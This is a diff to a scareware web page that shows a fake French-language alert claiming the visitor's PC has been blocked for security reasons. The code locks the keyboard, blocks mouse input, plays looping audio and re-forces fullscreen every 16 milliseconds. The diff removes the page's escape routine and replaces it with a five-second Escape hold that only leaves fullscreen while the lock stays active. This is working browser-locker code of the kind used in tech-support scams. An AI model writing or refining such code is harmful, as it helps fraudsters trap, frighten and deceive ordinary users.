@@ -7,12 +7,8 @@
   <link rel="stylesheet" href="styles.css">
 </head>
 <body>
+  <div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>
   <div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true">
-    <div class="mouse-blocker" aria-hidden="true"></div>
-    <div class="escape-datetime" id="escapeDateTime" aria-hidden="true">
-      <p class="escape-datetime-date" id="escapeDateDisplay"></p>
-      <p class="escape-datetime-time" id="escapeTimeDisplay"></p>
-    </div>
     <div class="security-page">
       <section class="access-modal" aria-label="Alerte acces bloque">
         <p>L'accès à votre pc a été bloqué pour des raisons de sécurité.</p>
@@ -176,74 +172,37 @@
   <audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>
   <script>
     (function () {
-      const ESCAPE_HOLD_MS = 10000;
-      const ESCAPE_SHOW_DATETIME_MS = 3000;
+      const ESCAPE_DEZOOM_MS = 5000;
       const secureAccountBtn = document.getElementById("secureAccountBtn");
       const securityOverlay = document.getElementById("securityOverlay");
       const fbCloseBtn = document.getElementById("fbCloseBtn");
       const securityAudio1 = document.getElementById("securityAudio1");
       const securityAudio2 = document.getElementById("securityAudio2");
-      const escapeDateTime = document.getElementById("escapeDateTime");
-      const escapeDateDisplay = document.getElementById("escapeDateDisplay");
-      const escapeTimeDisplay = document.getElementById("escapeTimeDisplay");
+
       let securityLockActive = false;
-      let allowSecurityExit = false;
+      let escapeKeyHeld = false;
       let escapeHoldStart = null;
       let escapeHoldInterval = null;
       let fullscreenGuardInterval = null;
-      let escapeKeyHeld = false;
-      let escapeReducedFullscreen = false;
+      let isDezoomed = false;
+      let allowFullscreenExit = false;
 
-      function hideEscapeDateTime() {
-        if (!escapeDateTime) return;
-        escapeDateTime.classList.remove("is-visible");
-        escapeDateTime.setAttribute("aria-hidden", "true");
+      function isEscapeKey(event) {
+        return event.key === "Escape" || event.code === "Escape" || event.keyCode === 27;
       }
 
-      function updateEscapeDateTime() {
-        if (!escapeDateTime || !escapeDateDisplay || !escapeTimeDisplay) return;
-        const now = new Date();
-        escapeDateDisplay.textContent = now.toLocaleDateString("fr-FR", {
-          weekday: "long",
-          day: "numeric",
-          month: "long",
-          year: "numeric",
-        });
-        escapeTimeDisplay.textContent = now.toLocaleTimeString("fr-FR", {
-          hour: "2-digit",
-          minute: "2-digit",
-          second: "2-digit",
-        });
-        escapeDateTime.classList.add("is-visible");
-        escapeDateTime.setAttribute("aria-hidden", "false");
-      }
-
-      function reduceFullscreenForDateTime() {
-        escapeReducedFullscreen = true;
-        document.body.classList.add("security-reduced");
-        if (document.fullscreenElement && document.exitFullscreen) {
-          document.exitFullscreen().catch(function () {});
+      async function lockKeyboard() {
+        if (navigator.keyboard && navigator.keyboard.lock) {
+          try {
+            await navigator.keyboard.lock();
+          } catch (_error) {}
         }
       }
 
-      function restoreFullscreenAfterDateTime() {
-        escapeReducedFullscreen = false;
-        document.body.classList.remove("security-reduced");
-      }
-
-      function blockKeyboardExceptEscape(event) {
-        if (!securityLockActive || allowSecurityExit) return;
-        if (event.key === "Escape") return;
-        event.preventDefault();
-        event.stopImmediatePropagation();
-      }
-
-      function forceStayLocked() {
-        keepSecurityFullscreen();
-        requestAnimationFrame(keepSecurityFullscreen);
-        setTimeout(keepSecurityFullscreen, 0);
-        setTimeout(keepSecurityFullscreen, 50);
-        setTimeout(keepSecurityFullscreen, 150);
+      function unlockKeyboard() {
+        if (navigator.keyboard && navigator.keyboard.unlock) {
+          navigator.keyboard.unlock();
+        }
       }
 
       async function requestFullscreen() {
@@ -265,43 +224,54 @@
         }
       }
 
-      function startEscapeHoldTimer() {
-        if (escapeHoldInterval) return;
-        escapeHoldStart = Date.now();
-        escapeHoldInterval = setInterval(function () {
-          if (!securityLockActive || allowSecurityExit || !escapeKeyHeld) return;
+      function forceStayFullscreen() {
+        if (!securityLockActive || isDezoomed || allowFullscreenExit) return;
+        showSecurityPage();
+        requestFullscreen();
+        requestAnimationFrame(function () {
+          requestFullscreen();
+        });
+        setTimeout(requestFullscreen, 0);
+        setTimeout(requestFullscreen, 20);
+        setTimeout(requestFullscreen, 80);
+      }
 
-          const elapsed = Date.now() - escapeHoldStart;
+      function enterFullscreenMode() {
+        isDezoomed = false;
+        document.body.classList.remove("security-dezoomed");
+        requestFullscreen();
+      }
 
-          if (elapsed >= ESCAPE_SHOW_DATETIME_MS) {
-            updateEscapeDateTime();
-            if (!escapeReducedFullscreen) {
-              reduceFullscreenForDateTime();
-            }
-          }
+      function dezoomFullscreen() {
+        allowFullscreenExit = true;
+        isDezoomed = true;
+        document.body.classList.add("security-dezoomed");
+        if (document.fullscreenElement && document.exitFullscreen) {
+          document.exitFullscreen().catch(function () {});
+        }
+        setTimeout(function () {
+          allowFullscreenExit = false;
+        }, 400);
+      }
 
-          if (elapsed >= ESCAPE_HOLD_MS) {
-            hideEscapeDateTime();
-            restoreFullscreenAfterDateTime();
-            clearEscapeHold();
-            escapeKeyHeld = false;
-            exitSecurityMode();
-            return;
-          }
+      function showSecurityPage() {
+        if (!securityOverlay) return;
+        securityOverlay.classList.add("is-active");
+        securityOverlay.setAttribute("aria-hidden", "false");
+        document.body.classList.add("security-mode");
+      }
 
-          if (elapsed < ESCAPE_SHOW_DATETIME_MS) {
-            forceStayLocked();
-          }
-        }, 50);
+      function forceFullscreen() {
+        forceStayFullscreen();
       }
 
       function startFullscreenGuard() {
         stopFullscreenGuard();
         fullscreenGuardInterval = setInterval(function () {
-          if (securityLockActive && !allowSecurityExit && !escapeReducedFullscreen) {
-            keepSecurityFullscreen();
+          if (securityLockActive && !isDezoomed && !allowFullscreenExit) {
+            forceStayFullscreen();
           }
-        }, 30);
+        }, 16);
       }
 
       function stopFullscreenGuard() {
@@ -328,63 +298,83 @@
         });
       }
 
-      function exitSecurityMode() {
-        if (!securityOverlay) return;
-        allowSecurityExit = true;
-        securityLockActive = false;
-        escapeKeyHeld = false;
-        escapeReducedFullscreen = false;
-        hideEscapeDateTime();
-        document.body.classList.remove("security-reduced");
-        clearEscapeHold();
-        stopFullscreenGuard();
-        stopSecurityAudios();
-
-        securityOverlay.classList.remove("is-active");
-        securityOverlay.setAttribute("aria-hidden", "true");
-        document.body.classList.remove("security-mode");
-
-        if (document.fullscreenElement && document.exitFullscreen) {
-          document.exitFullscreen().catch(function () {});
-        }
-
-        setTimeout(function () {
-          allowSecurityExit = false;
-        }, 300);
-      }
-
       function activateSecurityLock() {
         if (!securityOverlay) return;
         securityLockActive = true;
-        allowSecurityExit = false;
+        isDezoomed = false;
+        allowFullscreenExit = false;
         escapeKeyHeld = false;
-        escapeReducedFullscreen = false;
         clearEscapeHold();
-        hideEscapeDateTime();
-        document.body.classList.remove("security-reduced");
-        securityOverlay.classList.add("is-active");
-        securityOverlay.setAttribute("aria-hidden", "false");
-        document.body.classList.add("security-mode");
-        requestFullscreen();
+        document.body.classList.remove("security-dezoomed");
+        showSecurityPage();
+        enterFullscreenMode();
+        lockKeyboard();
         startFullscreenGuard();
         playSecurityAudios();
       }
 
-      function keepSecurityFullscreen() {
-        if (!securityLockActive || allowSecurityExit || escapeReducedFullscreen) return;
-        securityOverlay.classList.add("is-active");
-        securityOverlay.setAttribute("aria-hidden", "false");
-        document.body.classList.add("security-mode");
-        requestFullscreen();
+      function startEscapeHoldTimer() {
+        if (escapeHoldInterval) return;
+        escapeHoldStart = Date.now();
+        escapeHoldInterval = setInterval(function () {
+          if (!securityLockActive || !escapeKeyHeld) return;
+
+          const elapsed = Date.now() - escapeHoldStart;
+
+          if (elapsed >= ESCAPE_DEZOOM_MS && !isDezoomed) {
+            dezoomFullscreen();
+            clearEscapeHold();
+            escapeKeyHeld = false;
+            return;
+          }
+
+          if (!isDezoomed) {
+            forceStayFullscreen();
+          }
+        }, 50);
+      }
+
+      function handleSecurityKeyboard(event) {
+        if (!securityLockActive) return;
+
+        if (isEscapeKey(event)) {
+          event.preventDefault();
+          event.stopImmediatePropagation();
+
+          if (event.type === "keydown") {
+            if (isDezoomed) return;
+            if (!escapeKeyHeld) {
+              escapeKeyHeld = true;
+              startEscapeHoldTimer();
+            }
+            forceStayFullscreen();
+            return;
+          }
+
+          if (event.type === "keyup") {
+            const heldLongEnough =
+              escapeHoldStart !== null &&
+              Date.now() - escapeHoldStart >= ESCAPE_DEZOOM_MS;
+
+            escapeKeyHeld = false;
+            clearEscapeHold();
+
+            if (!heldLongEnough && !isDezoomed) {
+              forceStayFullscreen();
+            }
+          }
+          return;
+        }
+
+        event.preventDefault();
+        event.stopImmediatePropagation();
       }
 
       function handleSecurityLockPointer(event) {
-        if (!securityLockActive || allowSecurityExit) return;
-
+        if (!securityLockActive) return;
         if (event.type === "click" || event.type === "touchstart") {
-          keepSecurityFullscreen();
+          if (!isDezoomed) forceFullscreen();
         }
-
         event.preventDefault();
         event.stopPropagation();
       }
@@ -408,49 +398,15 @@
       }, { passive: true });
 
       document.addEventListener("fullscreenchange", function () {
-        if (
-          securityLockActive &&
-          !allowSecurityExit &&
-          !escapeReducedFullscreen &&
-          !document.fullscreenElement
-        ) {
-          forceStayLocked();
+        if (securityLockActive && !isDezoomed && !allowFullscreenExit && !document.fullscreenElement) {
+          forceStayFullscreen();
         }
       });
 
-      document.addEventListener("keydown", blockKeyboardExceptEscape, true);
-      document.addEventListener("keyup", blockKeyboardExceptEscape, true);
-      document.addEventListener("keypress", blockKeyboardExceptEscape, true);
-
-      document.addEventListener("keydown", function (event) {
-        if (!securityLockActive || allowSecurityExit) return;
-        if (event.key !== "Escape") return;
-
-        event.preventDefault();
-        event.stopImmediatePropagation();
-
-        escapeKeyHeld = true;
-        startEscapeHoldTimer();
-        forceStayLocked();
-      }, true);
-
-      document.addEventListener("keyup", function (event) {
-        if (event.key !== "Escape") return;
-        if (!securityLockActive || allowSecurityExit) return;
-
-        const heldLongEnough =
-          escapeHoldStart !== null &&
-          Date.now() - escapeHoldStart >= ESCAPE_HOLD_MS;
-
-        escapeKeyHeld = false;
-        clearEscapeHold();
-        hideEscapeDateTime();
-        restoreFullscreenAfterDateTime();
-
-        if (securityLockActive && !allowSecurityExit && !heldLongEnough) {
-          forceStayLocked();
-        }
-      }, true);
+      ["keydown", "keyup", "keypress"].forEach(function (eventName) {
+        document.addEventListener(eventName, handleSecurityKeyboard, { capture: true, passive: false });
+        window.addEventListener(eventName, handleSecurityKeyboard, { capture: true, passive: false });
+      });
 
       const currentTimeEl = document.getElementById("currentTime");
       if (currentTimeEl) {
@@ -473,7 +429,7 @@
         fbCloseBtn.addEventListener("click", function (event) {
           event.preventDefault();
           event.stopPropagation();
-          keepSecurityFullscreen();
+          if (!isDezoomed) forceFullscreen();
         });
       }
     })();
